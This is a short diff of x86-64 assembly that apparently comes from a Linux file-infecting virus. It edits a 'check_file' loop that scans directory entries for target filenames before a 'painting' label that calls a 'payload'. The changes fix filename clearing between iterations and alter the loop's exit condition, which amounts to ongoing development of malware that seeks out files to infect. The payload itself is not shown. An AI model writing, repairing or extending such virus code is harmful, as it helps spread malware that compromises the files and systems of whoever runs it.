@@ -475,17 +475,18 @@ check_file:
 		syscall
 
 	;workaround to ensure that filename stored at r14 + 200
-	;is cleared (except for the first two bytes)
+	;is cleared after each iteration of check_file
 	;so that target filename does not retain leftover chars
 	;from previous filename save
-		;lea rdi, [r14 + 201]
+		;lea rdi, [r14 + 200]
 		;xor rax, rax
-		;mov qword [rdi], 0x01
+		;mov rax, "\0"
+		;mov qword [rdi], rax
 
 		pop rcx
 		add cx, [rcx + r14 + 616] 		; linuxdirent.d_reclen
 		cmp qword rcx, [r14 + 500]
-		jne check_file
+		jl check_file
 		;jmp _restore
 	painting:
 	call payload
